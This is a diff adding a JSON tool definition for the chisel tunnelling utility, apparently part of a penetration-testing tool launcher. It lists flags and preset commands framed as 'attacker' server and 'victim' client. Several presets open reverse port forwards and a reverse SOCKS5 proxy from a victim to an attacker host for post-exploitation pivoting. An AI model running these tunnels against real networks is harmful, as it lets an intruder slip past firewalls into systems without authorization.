@@ -1,0 +1,162 @@
+{
+  "tool": {
+    "id": "chisel",
+    "name": "chisel",
+    "description": "Fast TCP/UDP tunnel over HTTP secured via SSH - reverse / forward port-forwarding through firewalls",
+    "executable": "chisel",
+    "runtime": "native",
+    "launchMode": "cli",
+    "category": "network",
+    "subcategory": "tunnel",
+    "tier": "essential",
+    "tags": ["tunnel", "pivot", "reverse-proxy", "post-exploit"],
+    "install": {
+      "method": "homebrew",
+      "source": "chisel"
+    },
+    "params": [
+      {
+        "label": "Mode",
+        "flag": "",
+        "type": "select",
+        "required": true,
+        "description": "Sub-command: server or client",
+        "options": [
+          { "value": "server", "label": "server (run on attacker)" },
+          { "value": "client", "label": "client (run on victim)" }
+        ]
+      },
+      {
+        "label": "Host:Port",
+        "flag": "",
+        "type": "string",
+        "description": "client mode: server URL (e.g. http://1.2.3.4:8080)",
+        "placeholder": "http://1.2.3.4:8080"
+      },
+      {
+        "label": "Tunnels",
+        "flag": "",
+        "type": "string",
+        "description": "client tunnels (e.g. R:8000:127.0.0.1:80, 1080:socks)",
+        "placeholder": "R:1080:socks"
+      },
+      {
+        "label": "Listen Host",
+        "flag": "--host",
+        "type": "string",
+        "description": "server: bind host",
+        "default": "0.0.0.0"
+      },
+      {
+        "label": "Listen Port",
+        "flag": "--port",
+        "type": "string",
+        "description": "server: bind port",
+        "default": "8080",
+        "placeholder": "8080"
+      },
+      {
+        "label": "Reverse",
+        "flag": "--reverse",
+        "type": "boolean",
+        "description": "server: allow clients to request reverse tunnels"
+      },
+      {
+        "label": "Auth",
+        "flag": "--auth",
+        "type": "string",
+        "description": "user:password (server side); --auth user:pass also on client",
+        "placeholder": "user:secret"
+      },
+      {
+        "label": "Keepalive",
+        "flag": "--keepalive",
+        "type": "string",
+        "description": "Keepalive interval (e.g. 25s)",
+        "default": "25s"
+      },
+      {
+        "label": "TLS Cert",
+        "flag": "--tls-cert",
+        "type": "string",
+        "description": "server: TLS cert path",
+        "placeholder": "cert.pem"
+      },
+      {
+        "label": "TLS Key",
+        "flag": "--tls-key",
+        "type": "string",
+        "description": "server: TLS key path",
+        "placeholder": "key.pem"
+      },
+      {
+        "label": "Skip TLS Verify",
+        "flag": "--tls-skip-verify",
+        "type": "boolean",
+        "description": "client: skip TLS cert verify (self-signed)"
+      },
+      {
+        "label": "SOCKS5",
+        "flag": "--socks5",
+        "type": "boolean",
+        "description": "server: enable SOCKS5 backend"
+      },
+      {
+        "label": "Verbose",
+        "flag": "-v",
+        "type": "boolean",
+        "description": "Verbose output"
+      }
+    ],
+    "skills": [
+      {
+        "id": "server-listen",
+        "name": "Server (attacker) - allow reverse",
+        "description": "Listen on 8080, allow reverse tunnels & SOCKS",
+        "args": "server --port 8080 --reverse --socks5",
+        "tags": ["server"]
+      },
+      {
+        "id": "server-auth",
+        "name": "Server with auth + reverse",
+        "description": "Auth-protected listener",
+        "args": "server --port 8080 --reverse --auth user:secret",
+        "tags": ["server", "auth"]
+      },
+      {
+        "id": "client-reverse-port",
+        "name": "Client - reverse forward (victim → attacker)",
+        "description": "Expose victim's :80 on attacker:8000",
+        "args": "client http://{{server_ip}}:8080 R:8000:127.0.0.1:80",
+        "tags": ["client", "reverse"]
+      },
+      {
+        "id": "client-reverse-socks",
+        "name": "Client - reverse SOCKS5",
+        "description": "Open SOCKS5 proxy on attacker:1080 routing through victim",
+        "args": "client http://{{server_ip}}:8080 R:1080:socks",
+        "tags": ["client", "socks"]
+      },
+      {
+        "id": "client-forward",
+        "name": "Client - local forward",
+        "description": "Forward local 9000 → server's 192.168.1.10:80",
+        "args": "client http://{{server_ip}}:8080 9000:192.168.1.10:80",
+        "tags": ["client", "forward"]
+      },
+      {
+        "id": "client-auth-tls",
+        "name": "Client - TLS + auth",
+        "description": "Connect via HTTPS with auth",
+        "args": "client --auth user:secret https://{{server_ip}}:8443 R:1080:socks",
+        "tags": ["client", "auth", "tls"]
+      }
+    ],
+    "output": {
+      "format": "text",
+      "produces": ["info"],
+      "detect": "chisel|tunnel|listening on",
+      "patterns": []
+    }
+  }
+}
